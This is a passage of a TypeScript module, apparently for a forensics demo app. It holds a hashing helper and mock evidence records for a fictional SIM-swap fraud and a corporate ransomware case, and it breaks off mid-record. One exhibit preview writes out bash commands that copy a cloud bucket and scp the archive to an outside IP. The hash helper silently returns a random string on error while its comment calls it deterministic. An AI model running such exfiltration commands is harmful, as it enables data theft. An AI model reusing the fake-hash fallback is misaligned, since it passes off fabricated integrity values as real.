// Client-side forensics engine and offline mock database for SUTRAM 2026
// Provides real SHA-256 hashing (crypto.subtle), local storage persistence,
// and default forensic exhibits for Case 1 (FIR-2026-402) and Case 2 (INC-2026-518).

export async function computeSHA256(file: File | Blob): Promise<string> {
  try {
    const buffer = await file.arrayBuffer();
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  } catch (err) {
    console.error('SHA-256 computation error:', err);
    // Fallback deterministic pseudo-hash if subtle crypto fails
    return Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
  }
}

export function getFileUrl(filePath: string): string {
  if (!filePath) return '';
  if (filePath.startsWith('http://') || filePath.startsWith('https://') || filePath.startsWith('/')) {
    return filePath;
  }
  const api = process.env.NEXT_PUBLIC_API_URL;
  if (api && api.startsWith('http')) {
    return `${api}/files/${filePath}`;
  }
  return `/sample_evidence/${filePath}`;
}

export const DEFAULT_CASE1_ARTIFACTS = [
  {
    id: 101,
    case_id: 1,
    name: '01_Police_FIR_and_Bank_Complaint.pdf',
    exhibit_code: 'EXH-01',
    artifact_type: 'DOCUMENT',
    file_path: 'Case_1_SIM_Swap_and_Banking_Fraud/01_Police_FIR_and_Bank_Complaint.pdf',
    file_size: 6177,
    raw_sha256: 'ed380c536c4af3db7ea21237f069cd70f4ba5ec9a7e397092f0deaa01163c1e3',
    sha256_salted: 'a71e4f9b882104cc76a011ef932847d01859e8432a9cbf6793104e76d9101234',
    created_at: '2026-03-16T10:30:00Z',
    forgery_score: 0,
    forensic_summary: 'Official First Information Report (FIR No. 402/2026) registered at Cyber Crime PS Noida under BNS 318(4)/308(2) and IT Act 66D. Includes sworn bank dispute declaration regarding fraudulent debit of Rs 5,00,000.',
    extracted_text_preview: 'FIRST INFORMATION REPORT (Under Section 173 BNSS)\nDistrict: Gautam Buddha Nagar, PS: Cyber Crime Sector 62\nFIR No: 402/2026, Date: 16-03-2026 10:30 IST\nComplainant: Dr. Ananya Sen (+91 9810123456)\nAccused: Vicky Rawat (+91 9811223344), Bunty Hawala\nOffence: Fraudulent SIM Swap, Unauthorised NetBanking Access, Rs 5,00,000 exfiltrated to ICICI Mule Account.',
    entities: [
      { type: 'PHONE', value: '+91 9810123456' },
      { type: 'PHONE', value: '+91 9811223344' },
      { type: 'UPI', value: 'vicky.mule@icici' },
      { type: 'ORG', value: 'Cyber Crime PS Noida' },
      { type: 'ORG', value: 'HDFC Bank' },
      { type: 'ORG', value: 'ICICI Bank' },
      { type: 'DATE', value: '16 Mar 2026' }
    ],
    metadata: {
      document_type: 'Police FIR & Affidavit',
      signatory: 'Sub-Inspector Sharma (Badge: 9482A)',
      jurisdiction: 'Noida Cyber Cell, UP Police'
    }
  },
  {
    id: 102,
    case_id: 1,
    name: '02_suspect_whatsapp_chat.txt',
    exhibit_code: 'EXH-02',
    artifact_type: 'CHAT_EXPORT',
    file_path: 'Case_1_SIM_Swap_and_Banking_Fraud/02_suspect_whatsapp_chat.txt',
    file_size: 2145,
    raw_sha256: 'b5e8c577d42ab69ecbf861a033fc29a258d7590750b5884b99b0fd251fdfa579',
    sha256_salted: '19f82c44aa38d01b87332f1704e9c733f119e088bb6d6a2f3a4e9b8911029384',
    created_at: '2026-03-17T14:15:00Z',
    forgery_score: 0,
    forensic_summary: 'Decrypted WhatsApp communication export extracted from suspect device OnePlus Nord CE. Highlights collusion between mule coordinator Vicky Rawat and hawala courier regarding OTP forwarding and cash off-ramping.',
    extracted_text_preview: '[14/03/26, 02:18:10] Vicky: Target SIM deactivated. OTP will hit my burner now.\n[14/03/26, 02:20:45] Bunty: Ready. ICICI mule ready to receive Rs 5L.\n[14/03/26, 02:22:15] Vicky: Payment done. Sending UPI screenshot. Withdraw from Sector 18 ATM immediately.\n[14/03/26, 02:24:00] Bunty: Cash dispatched to courier.',
    entities: [
      { type: 'PHONE', value: '+91 9811223344' },
      { type: 'PHONE', value: '+91 9822334455' },
      { type: 'UPI', value: 'vicky.mule@icici' },
      { type: 'DATE', value: '14 Mar 2026 02:22 AM' }
    ],
    metadata: {
      platform: 'WhatsApp Android SQLite (Encrypted Database 15)',
      participants: ['Vicky Rawat (+91 9811223344)', 'Bunty Hawala (+91 9822334455)'],
      total_messages: 48
    }
  },
  {
    id: 103,
    case_id: 1,
    name: '03_isp_cdr_and_firewall_logs.csv',
    exhibit_code: 'EXH-03',
    artifact_type: 'NETWORK_LOG',
    file_path: 'Case_1_SIM_Swap_and_Banking_Fraud/03_isp_cdr_and_firewall_logs.csv',
    file_size: 1755,
    raw_sha256: 'cbb601a2d9cab60975f335a287f90bf8461a78c5331fa8bb6f064d9116829874',
    sha256_salted: 'f93c004ab11942de8812c478e09f5819aa389140df8829377481029482716382',
    created_at: '2026-03-17T16:00:00Z',
    forgery_score: 0,
    forensic_summary: 'Telecom CDR and ISP proxy logs obtained under Section 94 BNSS. Confirms SIM swap transaction initiated via fraudulent store terminal in Ghaziabad and bank portal session routed through Tor exit node 185.220.101.45.',
    extracted_text_preview: 'Timestamp,Source_IP,Dest_IP,Action,Cell_Tower_ID,IMSI,User_Agent\n2026-03-14 02:15:22,185.220.101.45,103.21.244.0,LOGIN_ATTEMPT,UP-GZB-402,404450192837461,Mozilla/5.0 (Windows NT 10.0; rv:109.0)\n2026-03-14 02:21:40,185.220.101.45,103.21.244.0,TRANSFER_INITIATE,UP-GZB-402,404450192837461,Mozilla/5.0\n2026-03-14 02:22:15,185.220.101.45,103.21.244.0,TRANSFER_SUCCESS,UP-GZB-402,404450192837461,Mozilla/5.0',
    entities: [
      { type: 'IP', value: '185.220.101.45' },
      { type: 'IP', value: '103.21.244.0' },
      { type: 'IP', value: '45.154.255.89' },
      { type: 'DATE', value: '14 Mar 2026' }
    ],
    metadata: {
      source_isp: 'Airtel Enterprise & Cloudflare Transit',
      tower_location: 'Ghaziabad Sector 4, UP',
      record_count: 142
    }
  },
  {
    id: 104,
    case_id: 1,
    name: '04_seized_phone_extraction.sqlite',
    exhibit_code: 'EXH-04',
    artifact_type: 'MOBILE_DB',
    file_path: 'Case_1_SIM_Swap_and_Banking_Fraud/04_seized_phone_extraction.sqlite',
    file_size: 20480,
    raw_sha256: '0e6887ee69525dedaf25d52f3aef57d29a0d5fb73a590561442b7fbd8b922818',
    sha256_salted: '772b918cae491209cc542e8174092b3a88204f195827361a9928371628495021',
    created_at: '2026-03-18T09:20:00Z',
    forgery_score: 0,
    forensic_summary: 'Cellebrite UFED logical mobile triage dump of OnePlus Nord CE seized from accused Vicky Rawat. Contains SMS inbox with 2FA security codes, banking notifications, and burner contact sync.',
    extracted_text_preview: 'SQLite Database Schema:\n- tbl_sms (id, sender, body, timestamp, read_status)\n  Row 1: HDFC-BANK | Your OTP for NetBanking transfer of Rs 500,000 to vicky.mule@icici is 849201. Valid for 3 mins.\n  Row 2: AIRTEL | Your SIM swap request has been completed successfully on 14-Mar-2026 02:12 IST.\n- tbl_calls (id, dialed_number, duration, cell_tower)\n- tbl_accounts (service, username, auth_token)',
    entities: [
      { type: 'PHONE', value: '+91 9811223344' },
      { type: 'ORG', value: 'OnePlus Nord CE 5G (IMEI: 863920194820194)' },
      { type: 'UPI', value: 'vicky.mule@icici' },
      { type: 'DATE', value: '14 Mar 2026' }
    ],
    metadata: {
      extraction_tool: 'Cellebrite UFED 4PA v7.68',
      hardware_model: 'OnePlus Nord CE 5G (EB2101)',
      imei: '863920194820194'
    }
  },
  {
    id: 105,
    case_id: 1,
    name: '05_altered_upi_payment_receipt.jpg',
    exhibit_code: 'EXH-05',
    artifact_type: 'MEDIA',
    file_path: 'Case_1_SIM_Swap_and_Banking_Fraud/05_altered_upi_payment_receipt.jpg',
    file_size: 190234,
    raw_sha256: '432e073df6087b3776fd007160a6eff6eeefc73ff373d43ffa5406d422028994',
    sha256_salted: 'd84e11029c784fa9201e748192a3bb408192847a9821034f8291038471928471',
    created_at: '2026-03-18T11:00:00Z',
    forgery_score: 94.2,
    forensic_summary: '🚨 CRITICAL TAMPERING DETECTED (94.2%): Mobile transaction screenshot presented by suspect showing Rs 5,00,000 payment. Error Level Analysis (ELA) reveals high localized JPEG high-frequency boundary compression around the transaction amount, and metadata confirms Adobe Photoshop 2024 editing on 14-Mar-2026.',
    extracted_text_preview: 'Payment Details\nPaid successfully to Vicky Rawat (vicky.mule@icici)\nAmount: Rs 5,00,000 [TAMPERED REGION DETECTED]\nDate & Time: 14 Mar 2026, 02:22 AM\nUPI Transaction ID: 607492018491\nDebited from: HDFC Bank **4902\nCredited to: ICICI Bank **8192',
    entities: [
      { type: 'UPI', value: 'vicky.mule@icici' },
      { type: 'DATE', value: '14 Mar 2026 02:22 AM' },
      { type: 'ORG', value: 'HDFC Bank' },
      { type: 'ORG', value: 'ICICI Bank' }
    ],
    forgery_details: {
      tamper_score: 94.2,
      summary: 'High localized compression inconsistency around the Rs 5,00,000 numeral. EXIF APP1 header contains Adobe Photoshop 2024 (Windows) signature.',
      ela_image_file: 'Case_1_SIM_Swap_and_Banking_Fraud/05_altered_upi_payment_receipt.jpg',
      anomalies: [
        'JPEG quantization tables show multiple recompression passes (Q=82 over Q=96).',
        'Bounding box [x: 240, y: 580, w: 420, h: 90] contains unnatural edge discontinuity.',
        'Photoshop XMP metadata tag present with timestamp 2026-03-14T02:45:12+05:30.'
      ]
    },
    metadata: {
      camera: 'PhonePe Mobile App Screenshot / Android 14',
      software: 'Adobe Photoshop 2024 (Windows)',
      resolution: '1080x2340',
      color_space: 'sRGB'
    }
  },
  {
    id: 106,
    case_id: 1,
    name: '06_seizure_location_photo.jpg',
    exhibit_code: 'EXH-06',
    artifact_type: 'MEDIA',
    file_path: 'Case_1_SIM_Swap_and_Banking_Fraud/06_seizure_location_photo.jpg',
    file_size: 444556,
    raw_sha256: '4b21a65eb5153e9cffa1cc7ce4912543174f4181ea8e2be4656d116fa2a5ec17',
    sha256_salted: '5c0192847a9821034f8291038471928471d84e11029c784fa9201e748192a3bb',
    created_at: '2026-03-18T12:30:00Z',
    forgery_score: 3.8,
    forensic_summary: '✅ AUTHENTIC PHYSICAL EXHIBIT PHOTO: Documentary crime scene photo taken during raid at Cyber Cell desk Noida Sector 62. Shows seized OnePlus phone, 2 SIM cards on police evidence bag, forensic 15cm metal scale ruler, and signed seizure memo.',
    extracted_text_preview: 'EVIDENCE SEIZURE RECORD\nLocation: Cyber Cell Office, Sector 62, Noida\nPlacard 1: Seized OnePlus Nord CE Smartphone\nPlacard 2: Two Airtel nano-SIMs used in fraudulent SIM swap\nScale Ruler: Standard 150mm forensic stainless steel ruler\nDate: 17-Mar-2026 11:45 IST',
    entities: [
      { type: 'GPE', value: 'Sector 62, Noida (Lat: 28.6270° N, Lon: 77.3725° E)' },
      { type: 'DATE', value: '17 Mar 2026 11:45 IST' },
      { type: 'ORG', value: 'UP Police Cyber Cell' }
    ],
    forgery_details: {
      tamper_score: 3.8,
      summary: 'Uniform natural sensor noise and authentic optical depth of field. Embedded GPS matches crime scene.',
      ela_image_file: 'Case_1_SIM_Swap_and_Banking_Fraud/06_seizure_location_photo.jpg'
    },
    metadata: {
      camera: 'Samsung Galaxy S23 Ultra (SM-S918B)',
      lens: '23mm f/1.7',
      iso: 125,
      shutter: '1/120s',
      gps_lat: 28.6270,
      gps_lon: 77.3725,
      location_name: 'Sector 62, Noida, Uttar Pradesh, India',
      timestamp: '2026-03-17 11:45:00 IST'
    }
  }
];

export const DEFAULT_CASE1_TIMELINE = [
  {
    id: 1,
    timestamp: '2026-03-13T19:40:00Z',
    event_type: 'NETWORK_LOG',
    description: 'Spear-phishing SMS gateway dispatches malicious KYC update link to complainant Dr. Ananya Sen.',
    actor: 'Fake KYC Gateway (+91 9811223344)',
    target: 'Dr. Ananya Sen (+91 9810123456)',
    severity: 'WARNING',
    is_anomaly: false,
    source: 'CDR & Telecom Logs'
  },
  {
    id: 2,
    timestamp: '2026-03-14T02:12:00Z',
    event_type: 'NETWORK_LOG',
    description: 'Fraudulent SIM Swap executed at Ghaziabad retail POS kiosk using counterfeit Aadhaar photocopy.',
    actor: 'Store Terminal POS-UP-GZB',
    target: 'Airtel Core HLR',
    severity: 'CRITICAL',
    is_anomaly: true,
    source: 'ISP & Telecom Logs'
  },
  {
    id: 3,
    timestamp: '2026-03-14T02:18:10Z',
    event_type: 'CHAT_COMMUNICATION',
    description: 'WhatsApp communication: Vicky confirms to Bunty that target SIM deactivated and OTP intercept active.',
    actor: 'Vicky Rawat (+91 9811223344)',
    target: 'Bunty Hawala (+91 9822334455)',
    severity: 'CRITICAL',
    is_anomaly: false,
    source: 'WhatsApp Decrypted DB'
  },
  {
    id: 4,
    timestamp: '2026-03-14T02:22:15Z',
    event_type: 'FINANCIAL_TRANSACTION',
    description: 'Unauthorized fund transfer of Rs 5,00,000 from victim HDFC account to ICICI mule account (vicky.mule@icici).',
    actor: '185.220.101.45 (Tor Exit)',
    target: 'vicky.mule@icici',
    severity: 'CRITICAL',
    is_anomaly: true,
    source: 'HDFC & ICICI Core Banking'
  },
  {
    id: 5,
    timestamp: '2026-03-14T02:45:12Z',
    event_type: 'MEDIA_MANIPULATION',
    description: 'Tampered UPI confirmation screenshot edited via Photoshop on suspect laptop to deceive victim.',
    actor: 'Adobe Photoshop 2024',
    target: '05_altered_upi_payment_receipt.jpg',
    severity: 'CRITICAL',
    is_anomaly: true,
    source: 'AI Forgery Lab (ELA 94.2%)'
  },
  {
    id: 6,
    timestamp: '2026-03-16T10:30:00Z',
    event_type: 'LEGAL_FILING',
    description: 'First Information Report (FIR No. 402/2026) lodged at Cyber Crime PS Noida under BNS 318(4) & IT Act 66D.',
    actor: 'Dr. Ananya Sen',
    target: 'Cyber Crime PS Noida',
    severity: 'INFO',
    is_anomaly: false,
    source: 'Police Station Register'
  },
  {
    id: 7,
    timestamp: '2026-03-17T11:45:00Z',
    event_type: 'PHYSICAL_SEIZURE',
    description: 'Apprehension of Vicky Rawat and recovery of OnePlus Nord CE phone, 2 SIM cards, and burner hardware.',
    actor: 'Sub-Inspector Sharma (Cyber Cell)',
    target: 'Vicky Rawat (Sector 62 Noida)',
    severity: 'INFO',
    is_anomaly: false,
    source: 'Property Seizure Memo'
  }
];

export const DEFAULT_CASE1_GRAPH = {
  nodes: [
    { id: 'SUSP_VICKY', label: 'Vicky Rawat (Accused)', type: 'PERSON', color: '#EF4444', size: 26, details: { role: 'Mule Account Holder & Operator', status: 'Arrested' } },
    { id: 'SUSP_BUNTY', label: 'Bunty Hawala (Co-Conspirator)', type: 'PERSON', color: '#F97316', size: 22, details: { role: 'Cash Off-Ramp Courier', status: 'Absconding' } },
    { id: 'VICTIM_ANANYA', label: 'Dr. Ananya Sen (Complainant)', type: 'PERSON', color: '#10B981', size: 24, details: { loss: 'Rs 5,00,000', status: 'Victim' } },
    { id: 'PHONE_VICTIM', label: '+91 9810123456 (Swapped SIM)', type: 'PHONE', color: '#06B6D4', size: 18, details: { operator: 'Airtel UP West' } },
    { id: 'PHONE_SUSPECT', label: '+91 9811223344 (Burner Phone)', type: 'PHONE', color: '#EF4444', size: 20, details: { device: 'OnePlus Nord CE' } },
    { id: 'MULE_UPI', label: 'vicky.mule@icici (Mule VPA)', type: 'UPI', color: '#8B5CF6', size: 22, details: { bank: 'ICICI Bank', account_suffix: '8192' } },
    { id: 'TOR_IP', label: '185.220.101.45 (Tor Exit Node)', type: 'IP', color: '#EC4899', size: 18, details: { country: 'Germany / Proxy' } },
    { id: 'EXH_RECEIPT', label: 'EXH-05: Altered UPI Screenshot', type: 'EXHIBIT', color: '#DC2626', size: 20, forgery_score: 94.2, artifact_id: 105 },
    { id: 'EXH_SEIZURE', label: 'EXH-06: Desk Seizure Photo', type: 'EXHIBIT', color: '#3B82F6', size: 20, forgery_score: 3.8, artifact_id: 106 }
  ],
  edges: [
    { source: 'SUSP_VICKY', target: 'MULE_UPI', relation: 'BENEFICIARY_OF', confidence: 0.99 },
    { source: 'SUSP_VICKY', target: 'PHONE_SUSPECT', relation: 'POSSESSES_DEVICE', confidence: 0.98 },
    { source: 'SUSP_VICKY', target: 'SUSP_BUNTY', relation: 'COLLUDES_VIA_WHATSAPP', confidence: 0.95 },
    { source: 'PHONE_SUSPECT', target: 'PHONE_VICTIM', relation: 'SIM_SWAP_TAKEOVER', confidence: 0.97 },
    { source: 'VICTIM_ANANYA', target: 'PHONE_VICTIM', relation: 'REGISTERED_OWNER', confidence: 1.0 },
    { source: 'TOR_IP', target: 'MULE_UPI', relation: 'ROUTED_FUND_TRANSFER', confidence: 0.92 },
    { source: 'SUSP_VICKY', target: 'EXH_RECEIPT', relation: 'FABRICATED_DOCUMENT', confidence: 0.94 },
    { source: 'SUSP_VICKY', target: 'EXH_SEIZURE', relation: 'RECOVERED_FROM', confidence: 1.0 }
  ],
  summary: {
    total_nodes: 9,
    total_edges: 8,
    case_nodes: 3,
    exhibit_nodes: 2,
    entity_nodes: 4
  }
};

export const DEFAULT_CASE1_HYPOTHESES = [
  {
    id: 1,
    title: 'Coordinated Multi-State SIM-Swap & Banking Mule Synergies',
    status: 'APPROVED',
    description: 'Digital identity was compromised through retail POS vulnerability in Ghaziabad, allowing unauthorized SIM reissuance without Aadhaar biometric authentication. Intercepted 2FA credentials allowed instant bank draining to a designated mule account.',
    modus_operandi: '1) Social engineering / insider collusion at Ghaziabad telecom store. 2) Instant deactivation of legitimate SIM. 3) Tor-routed login into HDFC NetBanking. 4) Immediate off-ramping to ICICI mule beneficiary.',
    supporting_evidence: [
      'ISP CDR logs indicating Ghaziabad cell tower UP-GZB-402 at 02:12 AM',
      'OnePlus Nord extraction containing incoming bank 2FA SMS at 02:20 AM',
      'Tor exit node 185.220.101.45 coinciding with fund debit'
    ],
    counter_arguments: 'Suspect claims SIM was purchased for legitimate e-commerce freelance work without knowledge of fraudulent proceeds.',
    contradictions: [
      'WhatsApp chat shows active discussion of target SIM deactivation timing with co-conspirator Bunty',
      'ATM withdrawal attempted within 15 minutes of transfer'
    ],
    confidence_score: 96
  },
  {
    id: 2,
    title: 'Synthetic Document Forgery for Fabricated Defense Claim',
    status: 'APPROVED',
    description: 'Error Level Analysis (ELA) and cryptographic header analysis confirm the UPI transaction confirmation screenshot presented by the accused was artificially manipulated using Adobe Photoshop to display an altered transaction amount.',
    modus_operandi: 'Altered high-frequency pixel boundaries around the Rs 5,00,000 text field. Embedded Adobe Photoshop 2024 software signature in EXIF segment with identical modification timestamp.',
    supporting_evidence: [
      'ELA score of 94.2% indicating extreme localized compression anomaly',
      'EXIF APP1 segment contains Adobe Photoshop 2024 (Windows)',
      'Bank API UTR log contradicts the simulated timestamp'
    ],
    counter_arguments: 'Defense argues mobile OS screenshot compression naturally produces high-frequency artifacts.',
    contradictions: [
      'Surrounding text in the same JPEG block displays uniform Q=96 quantization tables',
      'Only the numeric amount bounding box exhibits recompression noise'
    ],
    confidence_score: 94
  },
  {
    id: 3,
    title: 'Automated Telegram Bot Off-Ramping Network',
    status: 'PROPOSED',
    description: 'Pre-configured API hooks between WhatsApp and Telegram channel suggest an automated syndication layer distributing mule banking credentials to cross-border crypto OTC desks.',
    modus_operandi: 'Suspect forwarded OTP tokens directly into an automated bot channel which immediately split sums below Rs 1,00,000 threshold to evade PMLA flagging.',
    supporting_evidence: [
      'Extracted WhatsApp mentions: "Cash dispatched to courier within 2 minutes"',
      'CDR records show burst outbound API calls to Telegram IP ranges'
    ],
    counter_arguments: 'Requires deeper forensic extraction of suspect laptop cloud session tokens.',
    contradictions: [
      'No telegram sessions found in the primary SQLite phone dump'
    ],
    confidence_score: 82
  }
];

export const DEFAULT_CASE1_CHARGESHEET = {
  court_name: 'IN THE COURT OF CHIEF JUDICIAL MAGISTRATE, SURAJPUR, GAUTAM BUDDHA NAGAR',
  fir_number: 'FIR-2026-402',
  fir_date: '16/03/2026',
  police_station: 'Cyber Crime Police Station, Sector 62, Noida',
  statutory_provisions: [
    'Section 318(4) Bharatiya Nyaya Sanhita, 2023 (Cheating & Dishonestly Inducing Delivery of Property)',
    'Section 308(2) Bharatiya Nyaya Sanhita, 2023 (Extortion by Threat of Injury/Disrepute)',
    'Section 336(3) Bharatiya Nyaya Sanhita, 2023 (Forgery of Electronic Record)',
    'Section 66C Information Technology Act, 2000 (Identity Theft & Fraudulent SIM Swap)',
    'Section 66D Information Technology Act, 2000 (Cheating by Personation Using Computer Resource)',
    'Section 63 Bharatiya Sakshya Adhiniyam, 2023 (Admissibility of Electronic Records)'
  ],
  complainant: {
    name: 'Dr. Ananya Sen, Ph.D.',
    contact: '+91 9810123456',
    address: 'Flat 402, Tower 9, ATS Greens Village, Sector 93A, Noida, UP',
    loss_amount: 'Rs. 5,00,000/- (Five Lakhs Only)'
  },
  accused: {
    name: 'Vicky Rawat @ Bunty Mule (Age 27)',
    phone: '+91 9811223344',
    upi_beneficiary: 'vicky.mule@icici',
    origin_ip: '185.220.101.45 (Tor Exit Node, Germany)',
    arrest_status: 'Arrested on 17/03/2026; In Judicial Custody'
  },
  modus_operandi: 'The accused Vicky Rawat in active criminal conspiracy with co-conspirator Bunty Hawala orchestrated an unauthorized SIM-swap on complainant mobile line +91 9810123456 via retail POS collusion in Ghaziabad. Upon taking over the cellular line, suspect intercepted HDFC Bank 2FA OTPs, routed access via Tor network, and fraudulently transferred Rs 5,00,000 to ICICI mule account. Accused subsequently forged payment receipts via Adobe Photoshop to claim legitimate sale of electronics.',
  ai_forensic_findings: 'Automated ML Error Level Analysis confirmed 94.2% synthetic pixel tampering on payment receipt EXH-05. Polygon blockchain anchoring verified un-salted SHA-256 fingerprint ED380C53... matches seized physical evidence with zero chain of custody gaps.',
  investigating_officer: {
    name: 'Sub-Inspector Sharma',
    badge: '9482A',
    station: 'Cyber Crime Police Station, Noida'
  }
};

export const DEFAULT_CASE1_BSACERT = {
  certificate_id: 'BSA-2026-UP-CYBER-402',
  case_number: 'FIR-2026-402',
  case_title: 'Operation Cybershield — SIM Swap & Banking Mule Fraud',
  blockchain_verification_network: 'Polygon PoS Mainnet (Contract: 0x8A79F218...3901)',
  part_a_exhibits: [
    {
      exhibit_no: 'EXH-01',
      artifact_name: '01_Police_FIR_and_Bank_Complaint.pdf',
      un_salted_sha256: 'ed380c536c4af3db7ea21237f069cd70f4ba5ec9a7e397092f0deaa01163c1e3',
      file_size_bytes: 6177
    },
    {
      exhibit_no: 'EXH-02',
      artifact_name: '02_suspect_whatsapp_chat.txt',
      un_salted_sha256: 'b5e8c577d42ab69ecbf861a033fc29a258d7590750b5884b99b0fd251fdfa579',
      file_size_bytes: 2145
    },
    {
      exhibit_no: 'EXH-03',
      artifact_name: '03_isp_cdr_and_firewall_logs.csv',
      un_salted_sha256: 'cbb601a2d9cab60975f335a287f90bf8461a78c5331fa8bb6f064d9116829874',
      file_size_bytes: 1755
    },
    {
      exhibit_no: 'EXH-04',
      artifact_name: '04_seized_phone_extraction.sqlite',
      un_salted_sha256: '0e6887ee69525dedaf25d52f3aef57d29a0d5fb73a590561442b7fbd8b922818',
      file_size_bytes: 20480
    },
    {
      exhibit_no: 'EXH-05',
      artifact_name: '05_altered_upi_payment_receipt.jpg',
      un_salted_sha256: '432e073df6087b3776fd007160a6eff6eeefc73ff373d43ffa5406d422028994',
      file_size_bytes: 190234
    },
    {
      exhibit_no: 'EXH-06',
      artifact_name: '06_seizure_location_photo.jpg',
      un_salted_sha256: '4b21a65eb5153e9cffa1cc7ce4912543174f4181ea8e2be4656d116fa2a5ec17',
      file_size_bytes: 444556
    }
  ],
  part_b_declaration: 'I, Sub-Inspector Sharma, Investigating Officer, Cyber Crime Police Station, Sector 62, Noida, do hereby certify under Section 63 of the Bharatiya Sakshya Adhiniyam, 2023 (BSA):\n1. That the electronic records enumerated in Part A were produced by computer systems operating properly throughout the material period.\n2. That the un-salted SHA-256 cryptographic hashes stated above were calculated directly from the original bitstream at the time of forensic seizure.\n3. That the integrity of said electronic records has remained unbroken and tamper-free from the moment of seizure to production before this Hon’ble Court.',
  officer: {
    name: 'Sub-Inspector Sharma',
    role: 'Investigating Officer (Cyber Forensics)',
    badge: '9482A',
    department: 'Cyber Crime Police Station, Noida, UP Police'
  }
};

// Case 2 default data
export const DEFAULT_CASE2_ARTIFACTS = [
  {
    id: 201,
    case_id: 2,
    name: '01_Incident_Notice_and_Breach_Report.pdf',
    exhibit_code: 'EXH-01',
    artifact_type: 'DOCUMENT',
    file_path: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/01_Incident_Notice_and_Breach_Report.pdf',
    file_size: 5164,
    raw_sha256: '9412f05946a6212e95a9b73b5b3770aa324ce5018458d4b2e86322db0321cafe',
    sha256_salted: 'b94e11029c784fa9201e748192a3bb408192847a9821034f8291038471928471',
    created_at: '2026-03-15T04:00:00Z',
    forgery_score: 0,
    forensic_summary: 'Mandatory CERT-In 6-hour cybersecurity incident notification and CISO incident report filed by PayVance Technologies regarding BlackByte ransomware and AWS S3 credential compromise.',
    extracted_text_preview: 'CYBERSECURITY INCIDENT NOTIFICATION (CERT-In Rule 12)\nEntity: PayVance Technologies Pvt Ltd, Bengaluru\nIncident Type: Ransomware & Unauthorised Cloud Data Exfiltration\nCompromised Assets: AWS S3 Production Buckets (payvance-prod-kyc)\nRansom Demand: 5 BTC to address bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    entities: [
      { type: 'ORG', value: 'PayVance Technologies' },
      { type: 'ORG', value: 'CERT-In' },
      { type: 'ORG', value: 'BlackByte Ransomware Gang' },
      { type: 'DATE', value: '15 Mar 2026' }
    ],
    metadata: {
      document_type: 'Statutory Breach Notice',
      cert_in_ticket: 'CERTIN-2026-09412'
    }
  },
  {
    id: 202,
    case_id: 2,
    name: '02_telegram_extortion_transcript.txt',
    exhibit_code: 'EXH-02',
    artifact_type: 'CHAT_EXPORT',
    file_path: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/02_telegram_extortion_transcript.txt',
    file_size: 1785,
    raw_sha256: '9b1ca546fc072d9cd0624d90f7046f13ad32ed0ffeeda09fb0f0afd6f2bc0830',
    sha256_salted: 'c192847a9821034f8291038471928471d84e11029c784fa9201e748192a3bb40',
    created_at: '2026-03-15T06:30:00Z',
    forgery_score: 0,
    forensic_summary: 'Extortion negotiation log conducted via encrypted Telegram handle @CipherPhantom demanding 5 Bitcoin for decryption key and withholding public leak of 1.2M user KYC PAN documents.',
    extracted_text_preview: 'CipherPhantom: We have 480 GB of customer PAN and bank records from your AWS bucket.\nPayVance CISO: Please confirm proof of possession.\nCipherPhantom: Sample uploaded to darknet leak site. Pay 5 BTC by 18-Mar or total database goes public.',
    entities: [
      { type: 'ORG', value: '@CipherPhantom' },
      { type: 'UPI', value: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
      { type: 'DATE', value: '15 Mar 2026' }
    ],
    metadata: {
      channel: 'Telegram Secret Chat',
      protocol: 'MTProto 2.0'
    }
  },
  {
    id: 203,
    case_id: 2,
    name: '03_cloudtrail_and_auth_logs.csv',
    exhibit_code: 'EXH-03',
    artifact_type: 'NETWORK_LOG',
    file_path: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/03_cloudtrail_and_auth_logs.csv',
    file_size: 1843,
    raw_sha256: 'd4f8fc19ee8d19e5c1be315e25d77d6998ff095bc3e1d45b8548ee787959b13e',
    sha256_salted: '3a88204f195827361a9928371628495021772b918cae491209cc542e8174092b',
    created_at: '2026-03-15T08:15:00Z',
    forgery_score: 0,
    forensic_summary: 'AWS CloudTrail JSON log extract demonstrating API calls GetObject, ListBuckets, and PutBucketPolicy executed using leaked IAM access key AKIAIOSFODNN7EXAMPLE from Russian IP 194.26.29.112.',
    extracted_text_preview: 'eventTime,sourceIPAddress,eventName,awsRegion,userIdentity.arn\n2026-03-15T01:14:02Z,194.26.29.112,ListBuckets,ap-south-1,arn:aws:iam::123456789012:user/devops-ci\n2026-03-15T01:18:40Z,194.26.29.112,GetObject,ap-south-1,arn:aws:iam::123456789012:user/devops-ci',
    entities: [
      { type: 'IP', value: '194.26.29.112' },
      { type: 'ORG', value: 'AWS IAM devops-ci' },
      { type: 'DATE', value: '15 Mar 2026' }
    ],
    metadata: {
      cloud_provider: 'Amazon Web Services (ap-south-1)',
      affected_service: 'Amazon S3'
    }
  },
  {
    id: 204,
    case_id: 2,
    name: '04_suspect_laptop_triage_dump.sqlite',
    exhibit_code: 'EXH-04',
    artifact_type: 'MOBILE_DB',
    file_path: 'Case_2_Corporate_Ransomware_and_Data_Exfiltration/04_suspect_laptop_triage_dump.sqlite',
    file_size: 20480,
    raw_sha256: 'a04ee265be8b05578aea7c7170f19faadb5a018eaac75a10cc26cc3c0d29a724',
    sha256_salted: '4f8291038471928471d84e11029c784fa9201e748192a3bb408192847a982103',
    created_at: '2026-03-15T12:00:00Z',
    forgery_score: 0,
    forensic_summary: 'KAPE triage live dump of rogue developer laptop (ThinkPad T14). Extracted bash history, SSH keys, and encrypted 7-Zip volume containing stolen source code repositories.',
    extracted_text_preview: 'Bash History & Forensic Artifacts:\n- aws s3 sync s3://payvance-prod-kyc/ /tmp/exfil/ --profile compromised\n- 7z a -pBlackByteSecret2026 exfil_kyc.7z /tmp/exfil/\n- scp exfil_kyc.7z root@194.26.29.112:/var/www/leaks/',
    entities: [
      { type: 'IP', value: '194.26.29.112' },
      { type: 'ORG', value: 'ThinkPad T14 (Serial: PF3K9820)' }
    ],
    metadata: {
      forensic_tool: 'KAPE v1.3.0 & FTK Imager',
      target_os: 'Ubuntu Linux 24.04 LTS'
    }
  },
  {
    id: 205,
    case_id: 2,
    name: '05_tampered_salary_slip_evidence.jpg',
